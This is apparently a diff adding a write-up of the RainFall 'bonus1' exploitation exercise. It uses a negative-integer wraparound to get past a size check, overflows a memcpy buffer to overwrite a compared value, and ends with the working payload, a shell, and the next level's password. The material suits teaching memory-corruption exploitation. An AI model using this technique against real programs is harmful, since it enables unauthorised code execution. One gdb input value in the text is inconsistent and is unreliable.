@@ -1,0 +1,92 @@
+for this exercise, we have the function main
+
+it call atoi to convert first argument to int
+then i call memcpy too copy the second argument on a buffer of the size of 36
+and the a call to execl that will open a shell
+
+there are a few conditional jumps
+
+   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
+   0x08048446 <+34>:	jle    0x804844f <main+43>
+
+
+our number must be inferior to 9 otherwise it will exit
+
+   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
+   0x08048480 <+92>:	jne    0x804849e <main+122>
+
+our number must later be equal to 0x574f4c46 or it will not call execl
+
+since the memcpy will be our only way to change the value of the integer we input
+we look at it's argument
+
+
+   0x08048468 <+68>:	mov    %ecx,0x8(%esp)  -> our int multiplied by 4    ( 0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx )
+   0x0804846c <+72>:	mov    %edx,0x4(%esp)  -> our string input argv[2] source for memcpy
+   0x08048470 <+76>:	mov    %eax,(%esp)	   -> dest of memcpy
+   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
+
+
+so to overflow the program we need to copy more than 36 character
+ it will be possible if we can input a value over 9 and avoid the progrom from exiting
+
+ we will do that by inputting a negativ value !
+
+ ./bonus1 -10 123456789112233445566778899111222333444555666777888999
+	segfault
+
+perfect so lets see what is the value of our input * 4 before memcpy
+
+
+(gdb) x/x 0x8+$esp
+0xbffff5d8:	0xffffffd8
+
+as it's unsigned int input -10 will make it UINT_MAX - 10
+
+we need to input a number so that we have a normal value for memcpy higher than 36 to overflow the buffer
+
+the program multiply our number by 4 so we will input :
+
+-UINT_MAX / 4 + 1 
+
+and it will get back to 0
+so -UINT_MAX / 4 + 50 
+and memcpy will copy 49 char and overflow
+
+4294967295 / 4  + 1 = 1073741824 
+
+if we input the value -1073741824 the size parameter of memcpy we be equal to 0 because it will be higher than UINTMAX by 1 after beeing multiplied by 4
+
+we put breakpoint before memcpy then
+(gdb) r -1073741824 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+(gdb) x/d $esp+8
+0xbffff5f8:	0
+
+so memcpy will copy 0 bytes
+
+to get this value to 48 we reduce it by 12
+
+
+(gdb) r -10737418212 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+(gdb) x/d $esp+8
+0xbffff5f8:	48
+
+
+of so now we are able to copy 48 bytes and overflow the buffer
+
+we add breakpoint after memcpy
+(gdb)b *0x08048478
+(gdb) run -1073741812 123456789112233445566778899111222333444555666777888999
+(gdb) x/2x 0x3c+$esp
+0xbffff5fc:	0x36363535	0x37373736
+
+so the offset is at the position 55666 we will replace these by the value that we want for this comp 
+=> 0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
+
+let's do it
+
+
+bonus1@RainFall:~$ ./bonus1 -1073741812 $(python -c 'print("1234567891122334455667788991112223334445"+"\x57\x4f\x4c\x46"[::-1]+"6777888999")')
+$ cd ../bonus2 ; cat .pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
